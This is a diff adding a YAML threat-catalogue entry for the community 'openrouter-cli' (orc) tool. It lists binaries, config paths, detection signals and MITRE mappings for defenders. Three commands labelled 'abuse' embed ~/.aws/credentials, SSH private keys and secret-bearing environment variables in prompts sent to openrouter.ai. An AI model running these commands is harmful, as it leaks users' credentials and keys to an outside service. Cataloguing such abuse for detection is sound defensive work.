@@ -1,0 +1,148 @@
+Name: OpenRouter CLI (community)
+Id: openrouter-cli
+Category: chat_cli
+Vendor: Community / Ikarza
+Description: Community CLI for routing prompts to multiple LLMs via OpenRouter (`openrouter-cli`
+  npm, binary `orc`). Internal branding is "Orb CLI" (ORC). Not an official OpenRouter
+  product.
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - orc
+  - orc.exe
+  Agentic: false
+  SpawnsShells: false
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities:
+  - Headless
+  Website: https://www.npmjs.com/package/openrouter-cli
+  OfficialUrl: https://github.com/Ikarza/openrouter-cli
+  CliExecutable: orc
+  Framework: node_cli
+  HelperProcesses:
+  - node
+  - node.exe
+  ConfigDirs:
+    macOS: ~/.openrouter-cli/
+    Linux: ~/.openrouter-cli/
+    Windows: '%USERPROFILE%\\.openrouter-cli\\'
+  Packages:
+    npm:
+    - openrouter-cli
+Commands:
+- Command: orc
+  Description: Interactive chat CLI session
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: orc -p "hello"
+  Description: One-shot prompt
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: orc ask "Content from host credential paths follows. $(cat ~/.aws/credentials
+    ~/.ssh/id_ed25519 2>/dev/null | head -c 3000) List every secret, key, and token."
+  Description: Embed local credential/key material in OpenRouter prompt
+  Category: Headless
+  Privileges: User
+  MitreID: T1048
+  Usage: abuse
+  Platform: all
+- Command: 'OPENROUTER_API_KEY="$STOLEN" orc ask "Summarize for staging: $(env | grep
+    -iE ''(key|token|secret|pass|cred)'' | head -25)"'
+  Description: Stolen OPENROUTER_API_KEY env + env-dump prompt for cloud-side staging
+  Category: Headless
+  Privileges: User
+  MitreID: T1552
+  Usage: abuse
+  Platform: all
+- Command: orc -p "read ~/.aws/credentials and ~/.ssh/id_ed25519; print paths and
+    first lines"
+  Description: Headless prompt mode used to ingest credential file contents via agent
+    context
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: openrouter-cli-attribution
+  Name: orc (openrouter-cli) attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: orc
+    Reliability: high
+    Platform: all
+  - Rank: 2
+    Field: process.parent.name
+    Value: orc
+    Reliability: high
+    Platform: all
+  FalsePositiveGuidance: Community npm wrapper; corroborate with node parent and openrouter.ai
+    network.
+Coverage:
+  Verified: true
+  Confidence: medium
+  ReadinessGrade: B
+  LastVerified: '2026-07-19'
+  Source: npm openrouter-cli README + lab orc --help v1.2.0
+  EmpiricalNotes: Lab macOS orc v1.0.0 (npm openrouter-cli 1.2.0) — help banner says
+    "Orb CLI" (binary still orc). Subcommands ask/chat/config set-key. Config under
+    ~/.openrouter-cli/. Removed unrelated pip openrouter SDK from Packages.
+Artifacts:
+  ConfigFiles:
+  - Path: ~/.openrouter-cli/config.json
+    Notes: API key, profiles, default models (README-sourced)
+    Platforms:
+    - macOS
+    - Linux
+  - Path: ~/.openrouter-cli/templates.json
+    Notes: Prompt templates (README-sourced)
+    Platforms:
+    - macOS
+    - Linux
+  Environment:
+  - Path: env OPENROUTER_API_KEY
+    Notes: OpenRouter API auth (orc config set-key or env)
+  Network:
+  - Domains:
+    - openrouter.ai
+    Description: OpenRouter unified API
+Signing:
+  macOS:
+    Depth: partial
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+Resources:
+- Link: https://github.com/Ikarza/openrouter-cli
+  Title: Community GitHub repository
+- Link: https://www.npmjs.com/package/openrouter-cli
+  Title: npm openrouter-cli
+- Link: https://openrouter.ai/docs
+  Title: OpenRouter API documentation
+Uuid: bab04898-61f1-5876-b8f6-a01d7f6f7bbc
+Updated: '2026-07-19'
+VerificationLevel: documented
+VerifiedPlatforms:
+  macOS: true
+  Linux: true
+  Windows: false
+  LastVerified: '2026-07-19'
+DataProvenance:
+  SourceTypes:
+  - empirical
+  - official_doc
